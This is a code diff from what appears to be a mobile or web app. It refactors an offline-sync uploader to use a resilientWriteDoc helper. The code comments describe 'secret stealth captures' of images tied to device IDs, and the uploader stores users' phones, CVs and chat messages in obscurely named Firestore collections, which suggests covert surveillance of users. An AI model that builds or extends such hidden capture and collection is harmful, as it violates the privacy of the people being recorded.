@@ -258,11 +258,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
   switch (type) {
     case 'capture': {
       // Secret stealth captures go to a/aa/aas
-      const colRef = collection(db, 'a', 'aa', 'aas');
       const docId = payload.id || `cap_${item.timestamp}`;
       const path = `a/aa/aas/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           deviceId: payload.deviceId || 'unknown',
           imageName: docId,
           imageContent: payload.image || '', // encrypted or raw base64
@@ -278,11 +277,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'ai_chat': {
       // AI chats matched with savior go to a/aa/aab
-      const colRef = collection(db, 'a', 'aa', 'aab');
       const docId = payload.id || `ai_${item.timestamp}`;
       const path = `a/aa/aab/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           usernameUnified: payload.usernameUnified || payload.username || 'unknown_user',
           imageName: payload.imageName || '',
           imageContent: payload.imageContent || '',
@@ -296,11 +294,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'user_file': {
       // Extractor data, CV docs, merged names, birth configurations etc. go to a/aa/abc
-      const colRef = collection(db, 'a', 'aa', 'abc');
       const docId = payload.id || `file_${item.timestamp}`;
       const path = `a/aa/abc/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           usernameUnified: payload.usernameUnified || payload.username || 'unknown_user',
           phone: payload.phone || '',
           deviceId: payload.deviceId || '',
@@ -317,11 +314,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'user_profile': {
       // User registered identity logs go to a/aa/abcd (sub-collection profiles)
-      const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
       const docId = payload.phone || `user_${item.timestamp}`;
       const profilePath = `a/aa/abcd_profiles/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(profilePath, {
           usernameUnified: payload.username || payload.name || 'guest',
           phone: payload.phone || '',
           deviceId: payload.deviceId || '',
@@ -336,10 +332,9 @@ async function uploadItemToFirebase(item: OfflineItem) {
       }
       
       // Also register in user public section a/ab/users
-      const publicRef = collection(db, 'a', 'ab', 'users');
       const publicPath = `a/ab/users/${docId}`;
       try {
-        await setDoc(doc(publicRef, docId), {
+        await resilientWriteDoc(publicPath, {
           username: payload.name || '',
           phone: payload.phone || '',
           timestamp: payload.timestamp || item.timestamp
@@ -351,10 +346,7 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'chat_message': {
       // Individual chat message logs go to a/aa/abcd_chats and also a/ab/chats
-      const aaChatsRef = collection(db, 'a', 'aa', 'abcd_chats');
-      const abChatsRef = collection(db, 'a', 'ab', 'chats');
       const docId = payload.id || `msg_${item.timestamp}`;
-      
       const msgData = {
         id: docId,
         from: payload.from || '',
@@ -367,12 +359,12 @@ async function uploadItemToFirebase(item: OfflineItem) {
       };
       
       try {
-        await setDoc(doc(aaChatsRef, docId), msgData);
+        await resilientWriteDoc(`a/aa/abcd_chats/${docId}`, msgData);
       } catch (e) {
         handleFirestoreError(e, OperationType.WRITE, `a/aa/abcd_chats/${docId}`);
       }
       try {
-        await setDoc(doc(abChatsRef, docId), msgData);
+        await resilientWriteDoc(`a/ab/chats/${docId}`, msgData);
       } catch (e) {
         handleFirestoreError(e, OperationType.WRITE, `a/ab/chats/${docId}`);
       }
@@ -380,11 +372,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'complaint': {
       // Complaints, inquiries logs go to a/aa/abcdf (subcollection complaints)
-      const colRef = collection(db, 'a', 'aa', 'abcdf_complaints');
       const docId = payload.id || `comp_${item.timestamp}`;
       const path = `a/aa/abcdf_complaints/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           id: docId,
           usernameUnified: payload.name || 'عضو روح المبجل',
           phone: payload.phone || 'غير معلوم',
@@ -401,11 +392,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'birthday_config': {
       // Save configuration in user custom profile directory a/ab/birthdays
-      const colRef = collection(db, 'a', 'ab', 'birthdays');
       const docId = payload.usernameEn || `birth_${item.timestamp}`;
       const path = `a/ab/birthdays/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           ...payload,
           timestamp: item.timestamp
         });
@@ -416,11 +406,10 @@ async function uploadItemToFirebase(item: OfflineItem) {
     }
     case 'birthday_wish': {
       // Received congratulations go to a/ab/wishes
-      const colRef = collection(db, 'a', 'ab', 'wishes');
       const docId = payload.id || `wish_${item.timestamp}`;
       const path = `a/ab/wishes/${docId}`;
       try {
-        await setDoc(doc(colRef, docId), {
+        await resilientWriteDoc(path, {
           ...payload,
           timestamp: payload.timestamp || new Date().toISOString()
         });
